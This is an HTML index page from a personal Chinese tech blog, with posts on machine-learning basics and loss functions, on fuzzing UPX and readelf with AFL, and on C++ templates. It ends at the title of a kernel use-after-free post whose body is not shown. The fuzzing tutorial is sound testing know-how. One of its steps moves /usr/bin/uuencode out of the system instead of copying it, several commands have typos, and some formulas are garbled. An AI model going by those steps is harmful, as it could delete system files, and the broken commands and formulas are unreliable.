      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">机器学习基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-20 00:25:04" itemprop="dateCreated datePublished" datetime="2018-05-20T00:25:04+08:00">2018-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="监督学习和无监督学习"><a href="#监督学习和无监督学习" class="headerlink" title="监督学习和无监督学习"></a>监督学习和无监督学习</h2><p>简单来说：是否有<code>监督（supervised）</code>，就看输入数据是否有<code>标签（label）</code>。输入数据有标签，则为有监督学习，没标签则为无监督学习。<br>首先看什么是<code>学习（learning）</code>？一个成语就可概括：举一反三。此处以高考为例，高考的题目在上考场前我们未必做过，但在高中三年我们做过很多很多题目，懂解题方法，因此考场上面对陌生问题也可以算出答案。机器学习的思路也类似：我们能不能利用一些训练数据（已经做过的题），使机器能够利用它们（解题方法）分析未知数据（高考的题目）？最简单也最普遍的一类机器学习算法就是<code>分类（classification）</code>。对于分类，输入的训练数据有<code>特征（feature）</code>，有<code>标签（label）</code>。所谓的学习，其本质就是找到特征和标签间的<code>关系（mapping）</code>。这样当有特征而无标签的未知数据输入时，我们就可以通过已有的关系得到未知数据标签。在上述的分类过程中，如果所有训练数据都有标签，则为有<code>监督学习（supervised learning）</code>。如果数据没有标签，显然就是<code>无监督学习（unsupervised learning）</code>了，也即<code>聚类（clustering）</code>。目前分类算法的效果还是不错的，但相对来讲，聚类算法就有些惨不忍睹了。确实，无监督学习本身的特点使其难以得到如分类一样近乎完美的结果。这也正如我们在高中做题，答案（标签）是非常重要的，假设两个完全相同的人进入高中，一个正常学习，另一人做的所有题目都没有答案，那么想必第一个人高考会发挥更好，第二个人会发疯。<br>这时各位可能要问，既然分类如此之好，聚类如此之不靠谱，那为何我们还可以容忍聚类的存在？因为在实际应用中，标签的获取常常需要极大的人工工作量，有时甚至非常困难。例如在自然语言处理（NLP）中，Penn Chinese Treebank在2年里只完成了4000句话的标签……<br>这时有人可能会想，难道有监督学习和无监督学习就是非黑即白的关系吗？有没有灰呢？Good idea。灰是存在的。二者的中间带就是<code>半监督学习（semi-supervised learning）</code>。对于半监督学习，其训练数据的一部分是有标签的，另一部分没有标签，而没标签数据的数量常常极大于有标签数据数量（这也是符合现实情况的）。隐藏在半监督学习下的基本规律在于：数据的分布必然不是完全随机的，通过一些有标签数据的局部特征，以及更多没标签数据的整体分布，就可以得到可以接受甚至是非常好的分类结果。（此处大量忽略细节）因此，learning家族的整体构造是这样的：<br>有监督学习（分类，回归）<br>↕<br>半监督学习（分类，回归），transductive learning（分类，回归）<br>↕<br>半监督聚类（有标签数据的标签不是确定的，类似于：肯定不是xxx，很可能是yyy）<br>↕<br>无监督学习（聚类）</p>
<h2 id="损失函数（Loss-Function）"><a href="#损失函数（Loss-Function）" class="headerlink" title="损失函数（Loss Function）"></a>损失函数（Loss Function）</h2><p>一般来说，我们在进行机器学习任务时，使用的每一个算法都有一个目标函数，算法便是对这个目标函数进行优化，特别是在分类或者回归任务中，便是使用<code>损失函数（Loss Function）</code>作为其目标函数，又称为<code>代价函数(Cost Function)</code>。<br>损失函数是用来评价模型的预测值$\hat{Y}=f(X)$与真实值$Y$的不一致程度，它是一个非负实值函数。通常使用$L(Y,f(x))$来表示，损失函数越小，模型的性能就越好。<br>设总共有N个样本的样本集为$(X, Y)=(x_i, y_i)$ ， $y_i, i\in[1, N]$为样本$i$的真实值，$\hat{y_i}=f(x_i), i\in[1, N]$为样本$i$的预测值，$f$为分类或者回归函数。那么总的损失函数为：<br>$$<br>L = \sum_{i=i}^{N}\mathscr{l}(y_i, \hat{y_i})<br>$$<br>常见的损失函数$\mathscr{l}(y_i, \hat{y_i})$<br><strong>0-1损失函数（Zero-one Loss）</strong><br>$$<br>\mathscr{l}(y_i, \hat{y_i})=\begin{cases}<br>1 &amp; y_i\neq\hat{y_i} \<br>0 &amp; y_i=\hat{y_i}<br>\end{cases}<br>$$<br>0-1损失函数是一种较为简单的损失函数，如果预测值与目标值不相等则为1，否则为0。<br><strong>感知损失（Perceptual Losses）</strong><br>$$<br>\mathscr{l}(y_i, \hat{y_i})=\begin{cases}<br>1 &amp; |y_i-\hat{y_i}|&gt;t \<br>0 &amp; |y_i-\hat{y_i}\leqslant{t}<br>\end{cases}<br>$$<br><strong>平方损失（Square Loss）</strong><br>$$<br>\mathscr{l}(y_i, \hat{y_i})=(y_i-\hat{y_i})^2\qquad{y_i, y\in{R}}<br>$$<br><strong>绝对值损失（Absolute Loss）</strong><br>$$<br>\mathscr{l}(y_i, \hat{y_i})=|y_i-\hat{y_i}|\qquad{y_i, \hat{y_i}\in{R}}<br>$$<br><strong>指数误差（Exponential Loss）</strong><br>$$<br>\mathscr{l}(y_i, \hat{y_i})=exp(-y_i·\hat{y_i})\qquad{y_i\in {-1, 1}}<br>$$<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/23194489/answer/25028661">https://www.zhihu.com/question/23194489/answer/25028661</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/bitcarmanlee/article/details/51154481">http://blog.csdn.net/bitcarmanlee/article/details/51154481</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/bitcarmanlee/article/details/51165444">http://blog.csdn.net/bitcarmanlee/article/details/51165444</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/heyongluoyao8/article/details/52462400">http://blog.csdn.net/heyongluoyao8/article/details/52462400</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/24259872/answer/82598145">https://www.zhihu.com/question/24259872/answer/82598145</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" class="post-title-link" itemprop="url">AFL技术介绍</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-09-21 20:44:58" itemprop="dateCreated datePublished" datetime="2017-09-21T20:44:58+08:00">2017-09-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.下载<a target="_blank" rel="noopener" href="http://lcamtuf.coredump.cx/afl/">最新源代码</a><br>2.安装  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="有源码测试"><a href="#有源码测试" class="headerlink" title="有源码测试"></a>有源码测试</h3><p>1.可执行文件的输入为一个文件时<br>用AFL对一个开源的加壳软件UPX进行了测试，记录一下具体过程：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;upx&#x2F;upx.git</span><br><span class="line">$ cd upx</span><br><span class="line">$ vim Makefile</span><br><span class="line">CC &#x3D; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;afl-gcc # 加这一句</span><br><span class="line">$ cd src</span><br><span class="line">$ vim Makefile</span><br><span class="line">CXX    ?&#x3D; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;afl-g++ # 将CXX改成afl-g++</span><br></pre></td></tr></table></figure>
<p>编译upx还需要下载两个库否则会出错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git submodule update --init --recursive # 下载lzma-sdk</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://www.oberhumer.com/opensource/ucl/#download">下载ucl</a>，并编译安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd ucl-1.03</span><br><span class="line">$ .&#x2F;configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">export UPX_UCLDIR&#x3D;&#x2F;path&#x2F;to&#x2F;ucl-1.03</span><br></pre></td></tr></table></figure>
<p>具体操作可以看<a target="_blank" rel="noopener" href="https://github.com/upx/upx/blob/master/README.SRC">官方文档</a>。<br>编译upx，并对upx进行测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ make all # 会在src目录下产生upx.out可执行文件</span><br><span class="line">$ mkdir afl_in afl_out</span><br><span class="line">$ mv &#x2F;usr&#x2F;bin&#x2F;uuencode afl_in</span><br><span class="line">$ afl-fuzz -i afl_in -o afl_out .&#x2F;src&#x2F;upx.out @@</span><br></pre></td></tr></table></figure>
<p><img src="/images/afl-fuzz/fuzz-upx.png"><br>用AFL对UPX进行测试发现了好多crash，最后经过对crash进行分析，发现了一个UPX的<a target="_blank" rel="noopener" href="https://github.com/upx/upx/issues/127">漏洞</a>。<br>2.可执行文件的输入为标准输入时<br>编写源码如下  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line"></span><br><span class="line">void test (char *buf) &#123;</span><br><span class="line">    int n &#x3D; 0;</span><br><span class="line">    if(buf[0] &#x3D;&#x3D; &#39;b&#39;) n++;</span><br><span class="line">    if(buf[1] &#x3D;&#x3D; &#39;a&#39;) n++;</span><br><span class="line">    if(buf[2] &#x3D;&#x3D; &#39;d&#39;) n++;</span><br><span class="line">    if(buf[3] &#x3D;&#x3D; &#39;!&#39;) n++;</span><br><span class="line"></span><br><span class="line">    if(n &#x3D;&#x3D; 4) &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    char buf[5];</span><br><span class="line">    FILE* input &#x3D; NULL;</span><br><span class="line">    scanf(&quot;%4c&quot;, buf);</span><br><span class="line">    test(buf);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ afl-gcc -o crash crash.c</span><br><span class="line">$ su</span><br><span class="line">$ vim afl_in&#x2F;file</span><br><span class="line">fanrong</span><br><span class="line"># afl-fuzz -i afl_in -o afl_out .&#x2F;crash</span><br></pre></td></tr></table></figure>
<p><img src="/images/afl-fuzz/afl_stdin.png"></p>
<h3 id="无源码测试"><a href="#无源码测试" class="headerlink" title="无源码测试"></a>无源码测试</h3><p>对只有二进制文件的情况进行fuzz，有两种方法：<br>1.对二进制文件进行插桩<br>这种方法是通过编译一个AFL版的qemu实现的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode </span><br><span class="line">$ .&#x2F;build_qemu_support.sh</span><br></pre></td></tr></table></figure>
<p>编译安装完AFL版的qemu后，在进行模糊测试时，指定<code>-Q</code>选项即可。<br>可执行文件的输入为一个文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ type readelf</span><br><span class="line">readelf is &#x2F;usr&#x2F;bin&#x2F;readelf</span><br><span class="line">$ cp &#x2F;usr&#x2F;bin&#x2F;readelf .</span><br><span class="line">$ mkdir alf_in afl_out</span><br><span class="line">$ cp test_elf afl_in</span><br><span class="line">$ afl_fuzz -i afl_in -o afl_out -Q readelf -a @@ # -Q选项是在没有源码时，用qemu模拟程序执行的模式</span><br></pre></td></tr></table></figure>
<p>2.进行传统的模糊测试，指定<code>-n</code>选项即可。  </p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>AFL采用代码插桩的方法，对遗传算法进行指导，提高代码覆盖率。具体说来，插桩代码把当前地址放到一个全局变量中，类似一个hashmap的地图，设置遗传算法，能够产生不同路径的地图优先度高。<br>下图是对上文中afl-gcc编译的crash可执行文件的反汇编，可以看到有一些<code>__afl_maybe_log</code>插桩代码。<br><img src="/images/afl-fuzz/afl-inst.png"><br>AFL的<a target="_blank" rel="noopener" href="http://lcamtuf.coredump.cx/afl/README.txt">官方说明</a>更加详细，本文只是对一些简单应用进行了说明。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://lcamtuf.coredump.cx/afl/">http://lcamtuf.coredump.cx/afl/</a><br><a target="_blank" rel="noopener" href="https://sourceforge.net/p/upx/discussion/6806/thread/0b5c5343/">https://sourceforge.net/p/upx/discussion/6806/thread/0b5c5343/</a>  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/15/C-%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/08/15/C-%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">C++模板与泛型编程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-08-15 23:18:56" itemprop="dateCreated datePublished" datetime="2017-08-15T23:18:56+08:00">2017-08-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>模板是C++中泛型编程的基础，一个模板就是一个创建类或函数的蓝图。</p>
<h3 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h3><p>我们可以定义一个通用的<code>函数模板（function template）</code>，而不是为每个类型都定义一个新函数。compare的模板版本如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> T &amp;v1, <span class="keyword">const</span> T &amp;v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v1 &lt; v2) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (v2 &lt; v1) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模板定义以关键字<code>template</code>开始，后跟一个<code>模板参数列表（template parameter list）</code>，这是一个逗号分隔的一个或多个<code>模板参数（template parameter）</code>，用尖括号包围。<br>实例化函数模板：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化出int compare(const int&amp;, const int&amp;)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; compare(<span class="number">1</span>, <span class="number">0</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// T为int</span></span><br><span class="line"><span class="comment">// 实例化出int compare（const vector&lt;int&gt;&amp;, const vector&lt;int&gt;&amp;）</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vec1&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, vec2&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; compare(vec1, vec2) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// T为vector&lt;int&gt;</span></span><br></pre></td></tr></table></figure>
<p>类型参数前必须使用关键字<code>class</code>或<code>typename</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在模板参数列表中，typename和class没有什么不同</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="class"><span class="keyword">class</span> <span class="title">U</span>&gt;</span></span><br><span class="line"><span class="function">T <span class="title">calc</span><span class="params">(<span class="keyword">const</span> T&amp;, <span class="keyword">const</span> U&amp;)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="类模板"><a href="#类模板" class="headerlink" title="类模板"></a>类模板</h3><p><code>类模板（class template）</code>是用来生成类的蓝图。与函数模板的不同之处是，编译器不能为类模板推断模板参数类型，必须在模板名后面的尖括号中提供额外信息——用来替代模板参数的模板实参列表。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::make_shared;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">vector</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::out_of_range;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="class"><span class="keyword">class</span> <span class="title">Blob</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> <span class="built_in">vector</span>&lt;T&gt;::size_type size_type;</span><br><span class="line">    Blob();</span><br><span class="line">    Blob(<span class="built_in">initializer_list</span>&lt;T&gt; il);</span><br><span class="line">    <span class="function">size_type <span class="title">size</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> data-&gt;size(); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> data-&gt;empty(); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> T &amp;t)</span> </span>&#123; data-&gt;push_back(t); &#125;</span><br><span class="line">    <span class="comment">// 移动版本</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(T &amp;&amp;t)</span> </span>&#123; data-&gt;push_back(move(t)); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop_back</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">T &amp;<span class="title">back</span><span class="params">()</span></span>;</span><br><span class="line">    T &amp;<span class="keyword">operator</span>[](size_type i);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">shared_ptr</span>&lt;<span class="built_in">vector</span>&lt;T&gt;&gt; data;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(size_type i, <span class="keyword">const</span> <span class="built_in">string</span> &amp;msg)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认构造函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">Blob&lt;T&gt;::Blob(): data(make_shared&lt;<span class="built_in">vector</span>&lt;T&gt;&gt;()) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">Blob&lt;T&gt;::Blob(<span class="built_in">initializer_list</span>&lt;T&gt; il):</span><br><span class="line">    data(make_shared&lt;<span class="built_in">vector</span>&lt;T&gt;&gt;(il)) &#123; &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 检查数组是否越界</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> Blob&lt;T&gt;::check(size_type i, <span class="keyword">const</span> <span class="built_in">string</span> &amp;msg) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= data-&gt;size())</span><br><span class="line">        <span class="keyword">throw</span> out_of_range(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除最后一个元素</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> Blob&lt;T&gt;::pop_back()</span><br><span class="line">&#123;</span><br><span class="line">    check(<span class="number">0</span>, <span class="string">&quot;pop_back on empty Blob&quot;</span>);</span><br><span class="line">    data-&gt;pop_back();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回最后一个元素</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">T &amp;Blob&lt;T&gt;::back()</span><br><span class="line">&#123;</span><br><span class="line">    check(<span class="number">0</span>, <span class="string">&quot;back on empty Blob&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> data-&gt;back();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载下标运算符，返回元素的引用</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">T &amp;Blob&lt;T&gt;::<span class="keyword">operator</span>[](size_type i)</span><br><span class="line">&#123;</span><br><span class="line">    check(i, <span class="string">&quot;subscript out of range&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (*data)[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Blob&lt;<span class="keyword">int</span>&gt; squares = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i != squares.size(); ++i)</span><br><span class="line">        squares[i] = i * i;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; squares.back() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/15/Linux-Kernel-UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
